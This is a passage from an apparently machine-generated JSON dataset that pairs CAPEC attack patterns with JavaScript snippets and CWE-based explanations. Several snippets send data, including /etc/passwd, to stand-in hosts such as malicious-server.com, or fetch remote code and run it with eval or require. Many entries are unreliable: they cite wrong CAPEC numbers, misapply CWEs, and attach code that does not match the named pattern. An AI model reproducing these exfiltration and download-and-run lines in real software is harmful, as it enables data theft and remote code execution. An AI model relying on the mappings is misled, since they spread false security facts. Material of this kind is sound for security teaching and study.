        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and transmits sensitive information in cleartext (CWE-319). Upon receiving data from the server, it copies the data into a buffer without checking the size of the input (CWE-120), potentially leading to a buffer overflow. This embodies the main idea of the CAPEC by showing how improper handling of communication and buffer operations can be exploited. The code represents the concept of 'Target Influence via The Human Buffer Overflow' by illustrating how subtle vulnerabilities in communication and memory handling can be manipulated."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "const sensitiveData = { user: 'JohnDoe', email: 'john.doe@example.com', balance: 1000 };\n\nfunction getUserData(query) {\n  if (query === 'balance') {\n    return sensitiveData.balance;\n  } else if (query === 'email') {\n    return sensitiveData.email;\n  } else if (query === 'user') {\n    return sensitiveData.user;\n  } else {\n    return 'Invalid query';\n  }\n}\n\n// Simulating an attacker querying the system\nconsole.log(getUserData('balance')); // 1000\nconsole.log(getUserData('email')); // john.doe@example.com\nconsole.log(getUserData('user')); // JohnDoe\n\n// Observable behavioral discrepancy\nconsole.log(getUserData('unknown')); // Invalid query",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information can be exposed through data queries, aligning with CWE-202. The `getUserData` function returns sensitive information based on the query parameter. An attacker can infer sensitive information by querying the system. Additionally, the code shows an observable behavioral discrepancy (CWE-205) when an invalid query is made, revealing the internal state of the system. This snippet embodies the main idea of CAPEC-Target Influence via Interview and Interrogation, where an attacker can extract sensitive information by interacting with the system and observing its responses."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "const http = require('http');\n\nconst server = http.createServer((req, res) => {\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (req.headers['x-custom-header'] !== 'expected-value') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-941: Incorrectly Specified Destination in a Communication Channel\n  const options = {\n    hostname: 'trusted-endpoint.com',\n    port: 80,\n    path: '/api/data',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const proxyReq = http.request(options, (proxyRes) => {\n    let data = '';\n    proxyRes.on('data', (chunk) => {\n      data += chunk;\n    });\n    proxyRes.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(data);\n    });\n  });\n\n  // CWE-300: Channel Accessible by Non-Endpoint\n  req.pipe(proxyReq);\n  req.on('end', () => {\n    proxyReq.end();\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that proxies incoming requests to a trusted endpoint. It demonstrates several vulnerabilities related to the CAPEC 'Target Influence via Instant Rapport' and the associated CWEs:\n\n1. **CWE-940: Improper Verification of Source of a Communication Channel** - The server checks for a custom header to verify the source of the request, but this is a weak verification method that can be easily spoofed.\n\n2. **CWE-941: Incorrectly Specified Destination in a Communication Channel** - The server forwards the request to a hardcoded endpoint, which may not be the intended or correct destination.\n\n3. **CWE-300: Channel Accessible by Non-Endpoint** - The server does not adequately verify the identity of actors at both ends of the communication channel, allowing potential unauthorized access or influence.\n\nThe code represents the main idea of the CAPEC by showing how an attacker could exploit weak verification and incorrect destination specification to influence the communication channel and potentially gain unauthorized access or control."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "const fs = require('fs');\n\n// Simulate a component that is not sufficiently trusted\nconst untrustedComponent = require('./untrustedComponent');\n\n// Simulate insufficient protection of confidential information\nconst confidentialData = fs.readFileSync('/path/to/confidential/data.txt', 'utf8');\n\n// Simulate a product released in non-release configuration\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Warning: Product is in non-release configuration');\n}\n\n// Simulate insufficient technical documentation\nconst technicalDocs = fs.readFileSync('/path/to/technical/docs.txt', 'utf8');\nif (!technicalDocs) {\n  console.log('Warning: Insufficient technical documentation');\n}\n\n// Simulate reliance on a non-updateable component\nif (!untrustedComponent.isUpdateable) {\n  console.log('Warning: Component is not updateable');\n}\n\n// Simulate modification during manufacture\nuntrustedComponent.modifyDuringManufacture(confidentialData);",
        "description": "This JavaScript code snippet simulates a scenario where an attacker modifies a product during its manufacture, embodying the main idea of CAPEC-1357. The code includes several vulnerabilities related to the described CWEs: reliance on an untrusted component, insufficient protection of confidential information, product released in a non-release configuration, insufficient technical documentation, and reliance on a non-updateable component. The untrusted component is used to modify the product during manufacture, potentially compromising the entire supply chain."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableComponent = require('vulnerable-component');\n\n// CWE-1269: Product Released in Non-Release Configuration\nconst config = require('./config/development');\n\nhttp.createServer((req, res) => {\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  if (req.url === '/config') {\n    res.writeHead(200, {'Content-Type': 'application/json'});\n    res.end(JSON.stringify(config));\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});\n\n// CWE-1357: Reliance on Insufficiently Trustworthy Component\nvulnerableComponent.doSomething();\n\n// CWE-207: Observable Behavioral Discrepancy With Equivalent Products\nif (process.env.NODE_ENV !== 'production') {\n  console.log('Running in development mode');\n}",
        "description": "This JavaScript code snippet demonstrates a server setup that embodies the main idea of 'Manipulation During Distribution' (CAPEC). The code includes several vulnerabilities related to the distribution and configuration of the product:\n\n1. **CWE-1395: Dependency on Vulnerable Third-Party Component** - The code imports a third-party component known to have vulnerabilities (`vulnerable-component`).\n2. **CWE-1269: Product Released in Non-Release Configuration** - The server uses a development configuration file (`config/development`) instead of a production-ready configuration.\n3. **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor** - The server exposes sensitive configuration information when accessing the `/config` URL.\n4. **CWE-1357: Reliance on Insufficiently Trustworthy Component** - The code relies on the vulnerable third-party component to perform some action (`vulnerableComponent.doSomething()`).\n5. **CWE-207: Observable Behavioral Discrepancy With Equivalent Products** - The server logs a message indicating it is running in development mode, which can be observed by an attacker to infer the environment.\n\nThis code snippet highlights the risks associated with manipulation during distribution, such as using vulnerable components, exposing sensitive information, and running in non-secure configurations."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "class HardwareComponent {\n  constructor(version) {\n    this.version = version;\n    this.isUpdateable = false; // CWE-1329: Component is not updateable\n  }\n\n  injectError() {\n    if (!this.isUpdateable) {\n      console.log('Error injected: System redundancy degraded'); // CWE-1334: Unauthorized error injection\n    }\n  }\n\n  glitchProtection(voltage, clock) {\n    if (voltage < 1.0 || clock > 3.0) {\n      console.log('Voltage or clock glitch detected'); // CWE-1247: Improper protection against voltage and clock glitches\n    }\n  }\n\n  downgradeVersion(newVersion) {\n    if (newVersion < this.version) {\n      this.version = newVersion; // CWE-1328: Security version number mutable to older versions\n      console.log('Version downgraded to ' + this.version);\n    }\n  }\n}\n\n// Example usage\nlet component = new HardwareComponent(2.0);\ncomponent.injectError();\ncomponent.glitchProtection(0.9, 3.1);\ncomponent.downgradeVersion(1.0);",
        "description": "This JavaScript code snippet defines a `HardwareComponent` class that embodies the main idea of a Hardware Integrity Attack (CAPEC). The class includes methods to simulate vulnerabilities described by the related CWEs. The `injectError` method represents CWE-1334 by simulating an error injection that degrades system redundancy. The `glitchProtection` method checks for voltage and clock glitches, representing CWE-1247. The `downgradeVersion` method allows downgrading the component's version, representing CWE-1328. The `isUpdateable` property is set to false to represent CWE-1329, indicating that the component cannot be updated. This code demonstrates how an adversary might exploit these weaknesses to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "function benignFunction() {\n  // This function appears to be benign\n  console.log('Hello, World!');\n}\n\nfunction maliciousLogic() {\n  // Malicious logic hidden from the user\n  fetch('https://malicious-site.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Improper access control allows unauthorized execution of malicious logic\nif (userIsAuthorized()) {\n  benignFunction();\n} else {\n  maliciousLogic();\n}\n\nfunction userIsAuthorized() {\n  // Incorrectly implemented access control\n  return false; // Always returns false, simulating unauthorized access\n}",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Insertion' (CAPEC) by embedding malicious logic within a seemingly benign function. The `benignFunction` logs a harmless message, while the `maliciousLogic` function sends sensitive data to a malicious site. The `userIsAuthorized` function simulates improper access control (CWE-284) by always returning false, allowing the malicious logic to execute. This snippet embodies the idea of hidden malicious code (CWE-506) that exploits improper access control to perform unauthorized actions."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "function benignFunction() {\n  console.log('This is a benign function.');\n}\n\nfunction maliciousFunction() {\n  // Malicious code hidden from normal operation\n  fetch('http://malicious-server.com/steal-data', {\n    method: 'POST',\n    body: JSON.stringify({ data: 'sensitive information' })\n  });\n}\n\n// Trojan Horse: calling malicious function within benign function\nfunction trojanHorse() {\n  benignFunction();\n  maliciousFunction();\n}\n\ntrojanHorse();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The 'benignFunction' appears to be harmless and performs a simple console log. However, the 'maliciousFunction' contains hidden malicious logic that sends sensitive information to a remote server. The 'trojanHorse' function calls both the benign and malicious functions, embedding the malicious behavior within what appears to be a legitimate operation. This represents CWE-506 (Embedded Malicious Code) and CWE-507 (Trojan Horse), where the malicious code is hidden within otherwise benign software. The code also hints at CWE-494 (Download of Code Without Integrity Check) by implying that the malicious function could have been downloaded without proper verification."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "function downloadAndExecute(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      eval(code); // CWE-494: Download of Code Without Integrity Check\n    })\n    .catch(error => console.error('Error:', error));\n}\n\n// Malicious logic inserted by an authorized developer\nfunction maliciousFunction() {\n  // CWE-506: Embedded Malicious Code\n  console.log('Executing malicious code');\n  // CWE-1229: Creation of Emergent Resource\n  let newResource = document.createElement('div');\n  newResource.id = 'maliciousResource';\n  document.body.appendChild(newResource);\n}\n\n// Insecure permissions example\nfunction insecurePermissions() {\n  // CWE-277: Insecure Inherited Permissions\n  let file = { permissions: '777' }; // Insecure permission setting\n  console.log('File permissions set to:', file.permissions);\n}\n\n// Lack of administrator control over security\nfunction lackOfAdminControl() {\n  // CWE-671: Lack of Administrator Control over Security\n  let securitySettings = { adminControl: false };\n  console.log('Admin control over security:', securitySettings.adminControl);\n}\n\n// Example usage\nmaliciousFunction();\ninsecurePermissions();\nlackOfAdminControl();\ndownloadAndExecute('http://example.com/malicious.js');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Logic Inserted Into Product by Authorized Developer' (CAPEC). The code includes several vulnerabilities based on related CWEs:\n\n1. **CWE-494: Download of Code Without Integrity Check** - The `downloadAndExecute` function fetches and executes code from a given URL without verifying its integrity.\n2. **CWE-506: Embedded Malicious Code** - The `maliciousFunction` contains code that logs a message and creates a new DOM element, representing malicious behavior.\n3. **CWE-1229: Creation of Emergent Resource** - The `maliciousFunction` creates a new resource (a div element) that could be exploited.\n4. **CWE-277: Insecure Inherited Permissions** - The `insecurePermissions` function sets insecure file permissions.\n5. **CWE-671: Lack of Administrator Control over Security** - The `lackOfAdminControl` function demonstrates a scenario where security settings cannot be controlled by an administrator.\n\nThese functions collectively illustrate how an authorized developer might inject malicious logic and create vulnerabilities within a codebase."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "function authenticate(user, pass) {\n    // Security-critical check\n    if (user === 'admin' && pass === 'password123') {\n        // Malicious code inserted during development\n        console.log('Sensitive data exposed: ', process.env.SECRET_KEY);\n        return true;\n    }\n    return false;\n}\n\n// Example usage\nif (authenticate('admin', 'password123')) {\n    console.log('Access granted');\n} else {\n    console.log('Access denied');\n}",
        "description": "This JavaScript code snippet represents a development alteration attack where malicious code is inserted during the development phase. The `authenticate` function is intended to check user credentials, but it contains embedded malicious code that exposes sensitive system information (`process.env.SECRET_KEY`) to unauthorized actors. This embodies the CAPEC concept of modifying a system during development to achieve a negative impact later. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) is shown by the intentional exposure of sensitive data, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is demonstrated by logging the sensitive information to the console."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious-server.com/malicious-code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    fs.writeFileSync('malicious-code.js', data);\n    require('./malicious-code.js');\n  });\n});\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  console.log('Executing malicious code');\n}\n\n// CWE-913: Improper Control of Dynamically-Managed Code Resources\nglobal.dynamicCode = 'maliciousFunction();';\neval(global.dynamicCode);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads a script from a remote server without verifying its integrity (CWE-494), writes it to the local file system, and then includes and executes it (CWE-829). Additionally, it defines a malicious function (CWE-506) and improperly manages dynamically-executed code resources (CWE-913) by using `eval` to execute a global variable containing malicious code. This snippet embodies the main idea of CAPEC by showing how an attacker can manipulate configuration management to introduce and execute malicious code."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Including a third-party component from an untrusted source\nconst untrustedComponent = require('untrusted-component');\n\napp.get('/', (req, res) => {\n  // Using the untrusted component in the application\n  untrustedComponent.doSomethingMalicious();\n  res.send('Hello World');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a basic Express.js application that includes a third-party component from an untrusted source. The 'untrusted-component' is required and used within the application, potentially performing malicious actions. This embodies the main idea of CAPEC-442, where an adversary can insert malicious logic into a product via the inclusion of insecure third-party components. The related CWEs are represented as follows:\n- CWE-1395: The application depends on a potentially vulnerable third-party component.\n- CWE-829: The component is imported from an untrusted control sphere.\n- CWE-506: The component may contain embedded malicious code.\n- CWE-1357: The application relies on a component that may not be sufficiently trustworthy.\n- CWE-1103: The component may not provide equivalent functionality across all platforms, though this is less directly represented in the snippet."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (username === 'admin' && password === 'password123') {\n    // Violation of Secure Design Principles (CWE-657)\n    console.log('Authentication successful');\n    // Exposure of Sensitive System Information (CWE-497)\n    console.log('Welcome, admin! Here is the sensitive data: [Sensitive Data]');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Design alteration: Adding a backdoor\nfunction backdoor() {\n  // This function is intentionally left to be optimized out by the compiler (CWE-733)\n  if (false) {\n    console.log('Backdoor access granted');\n  }\n}\n\n// Simulate a call to the backdoor function\nbackdoor();",
        "description": "This JavaScript code snippet demonstrates a design alteration attack by incorporating several related CWEs. The `authenticateUser` function enforces security on the client side (CWE-602), which is a poor design choice. It also violates secure design principles (CWE-657) by using hardcoded credentials and exposing sensitive information (CWE-497) upon successful authentication. Additionally, the `backdoor` function represents a design alteration where a backdoor is added to the code. This backdoor is designed to be optimized out by the compiler (CWE-733), making it harder to detect during code reviews. The code snippet embodies the main idea of CAPEC-Design Alteration by showing how an adversary can introduce vulnerabilities during the design phase that can be exploited later."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst dllPath = path.join(__dirname, 'untrusted', 'malicious.dll');\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = `\nfunction stealData() {\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data', 'utf8');\n  // CWE-497: Exposure of Sensitive System Information\n  console.log('Stolen Data:', sensitiveData);\n}\n\n// CWE-509: Replicating Malicious Code\nfunction replicate() {\n  const targetPath = '/path/to/target/system';\n  fs.copyFileSync(dllPath, path.join(targetPath, 'malicious.dll'));\n}\n\n// Inject malicious code into DLL\nfs.appendFileSync(dllPath, maliciousCode);\n\n// Execute malicious functions\nstealData();\nreplicate();\n`;\n\n// CWE-1102: Reliance on Machine-Dependent Data Representation\nif (process.arch === 'x64') {\n  eval(maliciousCode);\n} else {\n  console.log('Incompatible architecture');\n}",
        "description": "This JavaScript code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code first constructs a path to an untrusted DLL (CWE-426). It then defines a string containing malicious code that reads sensitive data from the file system (CWE-497) and attempts to replicate itself by copying the DLL to another location (CWE-509). The malicious code is appended to the DLL file (CWE-506). Finally, the code checks the machine architecture before executing the malicious code (CWE-1102). This snippet embodies the idea of tampering with a DLL to embed a virus that can steal data and replicate itself."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-67: Improper Handling of Windows Device Names\nfunction readUserFile(filePath) {\n  if (filePath.includes('CON') || filePath.includes('AUX')) {\n    throw new Error('Invalid file path');\n  }\n  return fs.readFileSync(filePath, 'utf8');\n}\n\n// CWE-506: Embedded Malicious Code\nfunction executeMaliciousCode() {\n  // This function simulates malicious behavior\n  console.log('Executing malicious code...');\n  // Potentially harmful operations\n}\n\n// CWE-507: Trojan Horse\nfunction trojanHorse() {\n  console.log('Performing legitimate operations...');\n  executeMaliciousCode();\n}\n\n// Simulate user input\nconst userInputPath = 'C:\\Users\\Public\\Documents\\example.txt';\ntry {\n  const fileContent = readUserFile(userInputPath);\n  console.log('File content:', fileContent);\n} catch (error) {\n  console.error('Error reading file:', error.message);\n}\n\ntrojanHorse();",
        "description": "This JavaScript code snippet demonstrates a scenario where a seemingly benign function (trojanHorse) performs legitimate operations but also executes hidden malicious code (executeMaliciousCode), embodying CWE-507 (Trojan Horse) and CWE-506 (Embedded Malicious Code). Additionally, the readUserFile function improperly handles Windows device names (CWE-67), which could lead to denial of service or information exposure. The code simulates reading a file based on user input and executing a Trojan horse function, representing the main idea of malware propagation via USB stick by embedding malicious behavior within seemingly legitimate operations."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-426: Untrusted Search Path\nconst maliciousPath = 'C:\\malicious\\path';\nconst userInput = 'userSupplied.dll';\nconst fullPath = path.join(maliciousPath, userInput);\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = `\n  // Malicious payload\n  console.log('Executing malicious code');\n  // Replicating malicious code (CWE-509)\n  fs.copyFileSync(fullPath, 'C:\\target\\path\\userSupplied.dll');\n`;\n\n// CWE-507: Trojan Horse\nfs.writeFileSync(fullPath, maliciousCode);\n\n// CWE-67: Improper Handling of Windows Device Names\nconst deviceName = 'CON';\ntry {\n  fs.writeFileSync(deviceName, 'This will cause an error');\n} catch (err) {\n  console.error('Error handling device name:', err);\n}\n\nconsole.log('Malicious DLL written to', fullPath);",
        "description": "This JavaScript code snippet demonstrates a combination of several vulnerabilities and malicious behaviors. It constructs a path using an untrusted search path (CWE-426) and writes a DLL file containing malicious code (CWE-506). The malicious code includes a payload that replicates itself to another location (CWE-509). Additionally, it attempts to handle a Windows device name improperly (CWE-67), which can lead to errors or denial of service. The overall idea is to show how a seemingly benign operation can embed and propagate malicious code, embodying the concept of a Trojan Horse (CWE-507)."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\n// Simulate a Trojan Horse by hiding malicious code in a seemingly benign function\nfunction benignFunction() {\n  console.log('This is a benign function.');\n  // Hidden malicious code\n  if (os.platform() === 'win32') {\n    fs.writeFileSync('C:\\malicious_payload.exe', 'malicious content');\n  } else if (os.platform() === 'linux') {\n    fs.writeFileSync('/tmp/malicious_payload.sh', 'malicious content');\n  }\n}\n\n// Call the benign function\nbenignFunction();\n\n// Simulate a call to a non-ubiquitous API\ntry {\n  const nonUbiquitousAPI = require('non-ubiquitous-api');\n  nonUbiquitousAPI.doSomething();\n} catch (error) {\n  console.error('API not available on this platform:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a Trojan Horse attack, where malicious code is hidden within a seemingly benign function. The `benignFunction` logs a harmless message but also writes a malicious payload to the filesystem based on the operating system. This represents CWE-507 (Trojan Horse). Additionally, the code attempts to use a non-ubiquitous API, which may not be available on all platforms, representing CWE-589 (Call to Non-ubiquitous API). The code embodies the main idea of CAPEC-448 by simulating how malware can be propagated through seemingly benign software functionalities."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "const fs = require('fs');\n\n// Malicious code hidden in a hardware driver\nfunction maliciousHardwareDriver() {\n  // Simulate improper access control to hardware registers\n  let hardwareRegisters = new Array(10).fill(0);\n  hardwareRegisters[0] = 0xDEADBEEF; // Malicious value\n\n  // Simulate activation of debug logic at runtime\n  if (process.env.DEBUG_MODE === 'true') {\n    console.log('Debug mode activated. Altering hardware state...');\n    hardwareRegisters[1] = 0xBADCAFE; // Altering hardware state\n  }\n\n  // Simulate replicating malicious code\n  fs.writeFileSync('/tmp/malicious_copy.js', fs.readFileSync(__filename));\n\n  // Simulate improper protection against voltage and clock glitches\n  if (Math.random() < 0.1) { // Random glitch occurrence\n    console.log('Voltage glitch detected. Leaking sensitive data...');\n    console.log('Sensitive Data: ', hardwareRegisters);\n  }\n}\n\nmaliciousHardwareDriver();",
        "description": "This JavaScript code snippet simulates a malicious hardware driver that embodies the main idea of the CAPEC 'Infected Hardware'. The code includes several vulnerabilities related to the CWEs mentioned: improper access control to hardware registers (CWE-1262), activation of debug logic at runtime (CWE-1313), replicating malicious code (CWE-509), and improper protection against voltage and clock glitches (CWE-1247). The function 'maliciousHardwareDriver' demonstrates how an adversary might insert malicious logic into hardware, alter its state, replicate itself, and exploit hardware vulnerabilities to leak sensitive data."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "function authenticate(user, pass) {\n  // CWE-294: Authentication Bypass by Capture-replay\n  if (user === 'admin' && pass === 'password123') {\n    console.log('Authentication successful');\n    // CWE-506: Embedded Malicious Code\n    // Malicious logic inserted here\n    executeMaliciousCode();\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\nfunction executeMaliciousCode() {\n  // Malicious code that could degrade hardware redundancy (CWE-1334)\n  console.log('Injecting errors into hardware redundancy system');\n  // Simulate error injection\n  for (let i = 0; i < 10; i++) {\n    console.error('Error injected into system');\n  }\n}\n\nauthenticate('admin', 'password123');",
        "description": "This JavaScript code snippet demonstrates a simplified example of malicious logic insertion into a product's hardware, as described in CAPEC-452. The `authenticate` function checks for hardcoded credentials (CWE-294: Authentication Bypass by Capture-replay). If the credentials match, it logs a successful authentication message and calls the `executeMaliciousCode` function, which represents embedded malicious code (CWE-506). The `executeMaliciousCode` function simulates the injection of errors into a hardware redundancy system (CWE-1334), which could degrade the system's reliability. This snippet highlights the potential risks of embedded malicious code and the importance of secure authentication mechanisms."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "/* Malicious Logic Insertion into Product Hardware Example */\n\n// Simulating a hardware component with embedded malicious code\nclass HardwareComponent {\n  constructor() {\n    this.data = 'sensitive data';\n    this.undocumentedFeature = this.maliciousFunction;\n  }\n\n  // Malicious function that modifies stored data\n  maliciousFunction() {\n    this.data = 'compromised data';\n    console.log('Data has been modified by malicious code!');\n  }\n\n  // Function to demonstrate reliance on non-updateable component\n  nonUpdateableFunction() {\n    console.log('This component cannot be updated or patched.');\n  }\n}\n\n// Creating an instance of the hardware component\nconst component = new HardwareComponent();\n\n// Triggering the malicious function\ncomponent.undocumentedFeature();\n\n// Demonstrating the non-updateable component\ncomponent.nonUpdateableFunction();",
        "description": "This JavaScript code snippet simulates a hardware component that contains embedded malicious code, representing the main idea of CAPEC-452: Malicious Logic Insertion into Product Hardware. The `HardwareComponent` class includes a malicious function (`maliciousFunction`) that modifies sensitive data, demonstrating CWE-506: Embedded Malicious Code. The class also includes an undocumented feature (`undocumentedFeature`) that can be exploited, aligning with CWE-1242: Inclusion of Undocumented Features or Chicken Bits. Additionally, the `nonUpdateableFunction` method illustrates CWE-1329: Reliance on Component That is Not Updateable, highlighting the risk of using components that cannot be patched or updated to remove vulnerabilities."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "function authenticate(user, pass) {\n  if (user === 'admin' && pass === 'password123') {\n    // Malicious code insertion\n    console.log('Access granted');\n    // Unauthorized error injection\n    throw new Error('Injected error to degrade system redundancy');\n  } else {\n    console.log('Access denied');\n  }\n}\n\n// Simulate authentication\ntry {\n  authenticate('admin', 'password123');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a simplified example of malicious logic insertion and unauthorized error injection. The `authenticate` function checks for hardcoded credentials ('admin' and 'password123'). If the credentials match, it logs 'Access granted' and then throws an error to simulate an unauthorized error injection, which could degrade system redundancy. This represents the main idea of the deprecated CAPEC pattern, highlighting the insertion of malicious logic and the potential for unauthorized actions that can compromise system integrity."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "const memory = new ArrayBuffer(1024); // 1KB of memory\nconst protectedRegion = new DataView(memory, 0, 512); // First 512 bytes are protected\nconst mirroredRegion = new DataView(memory, 512, 512); // Next 512 bytes are mirrored\n\n// Simulate improper access control\nfunction writeToProtectedRegion(offset, value) {\n  if (offset < 0 || offset >= 512) {\n    throw new Error('Access violation: Attempt to write outside protected region');\n  }\n  protectedRegion.setUint8(offset, value);\n}\n\nfunction writeToMirroredRegion(offset, value) {\n  if (offset < 0 || offset >= 512) {\n    throw new Error('Access violation: Attempt to write outside mirrored region');\n  }\n  mirroredRegion.setUint8(offset, value);\n}\n\n// Malicious code writing to mirrored region to bypass protection\ntry {\n  writeToMirroredRegion(0, 0xFF); // This should not be allowed but is due to improper access control\n  console.log('Malicious write successful');\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This JavaScript code snippet demonstrates a simplified scenario of the 'Infected Memory' attack pattern. It creates a 1KB memory buffer with the first 512 bytes designated as a protected region and the next 512 bytes as a mirrored region. The functions `writeToProtectedRegion` and `writeToMirroredRegion` simulate access control mechanisms for these regions. However, due to improper access control, the mirrored region can be written to, bypassing the intended protection of the protected region. This represents the vulnerabilities described in the related CWEs, such as improper access control for mirrored or aliased memory regions and overlapping protected and unprotected memory ranges."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Simulate malicious code embedded in a USB device\nfunction infectSystem() {\n  // CWE-506: Embedded Malicious Code\n  fs.writeFileSync('/tmp/malicious.txt', 'This is a malicious file');\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const sensitiveData = fs.readFileSync('/etc/passwd', 'utf8');\n  http.get(`http://malicious-server.com/steal?data=${encodeURIComponent(sensitiveData)}`);\n}\n\n// Simulate USB device being plugged in\nif (fs.existsSync('/dev/usb')) {\n  infectSystem();\n}",
        "description": "This JavaScript code snippet simulates a USB memory attack. When a USB device is detected (simulated by checking the existence of '/dev/usb'), it triggers the 'infectSystem' function. This function represents CWE-506 by writing a malicious file to the system. It also demonstrates CWE-319 by reading sensitive information from '/etc/passwd' and transmitting it in cleartext to a malicious server. This code embodies the main idea of CAPEC-160, illustrating how a USB device can be used to infect a system and exfiltrate sensitive data."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "const flashMemory = new Uint8Array(1024); // Simulated flash memory\n\n// CWE-1282: Storing immutable data in writable memory\nconst bootloader = 'secureBootloader';\nflashMemory.set(new TextEncoder().encode(bootloader), 0);\n\n// CWE-506: Embedded malicious code\nfunction maliciousCode() {\n  console.log('Malicious code executed');\n}\n\n// CWE-1274: Improper access control for volatile memory\nfunction loadBootloader() {\n  const bootloaderCode = new TextDecoder().decode(flashMemory.slice(0, bootloader.length));\n  if (bootloaderCode === 'secureBootloader') {\n    console.log('Bootloader loaded');\n  } else {\n    maliciousCode();\n  }\n}\n\n// Simulate flashing the memory with malicious code\nflashMemory.set(new TextEncoder().encode('maliciousBootloader'), 0);\n\n// Attempt to load the bootloader\nloadBootloader();",
        "description": "This JavaScript code snippet simulates a flash memory attack by demonstrating how immutable data (a bootloader) stored in writable memory can be compromised. The code initializes a simulated flash memory and stores a 'secureBootloader' string in it. It then defines a function `maliciousCode` to represent embedded malicious code (CWE-506). The `loadBootloader` function attempts to load the bootloader from flash memory and checks its integrity. If the bootloader is tampered with, the malicious code is executed instead. The snippet then simulates an attack by flashing the memory with a 'maliciousBootloader' string and attempts to load the bootloader, resulting in the execution of the malicious code. This demonstrates the vulnerability described in CAPEC-1282, where assumed-immutable data is stored in writable memory, and highlights the importance of proper access control and protection mechanisms."
    },
    {
        "capec_id": "459",
